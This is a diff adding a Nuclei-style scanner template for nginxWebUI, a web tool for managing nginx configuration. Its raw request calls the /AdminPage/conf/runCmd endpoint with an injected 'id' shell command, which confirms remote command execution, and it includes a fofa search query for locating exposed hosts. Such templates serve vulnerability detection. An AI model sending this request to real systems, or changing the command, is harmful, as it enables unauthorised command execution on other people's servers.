@@ -1,0 +1,27 @@
+id: nginxwebui
+info:
+  name: nginxwebui
+  author: mike
+  severity: info
+  description: nginxWebUI是一款图形化管理nginx配置的工具，能通过网页快速配置nginx的各种功能，包括HTTP和TCP协议转发、反向代理、负载均衡、静态HTML服务器以及SSL证书的自动申请、续签和配置，配置完成后可以一键生成nginx.conf文件，并控制nginx使用此文件进行启动和重载。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "nginxWebUI"
+http:
+  - raw:
+      - |
+        GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: Keep-Alive  
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
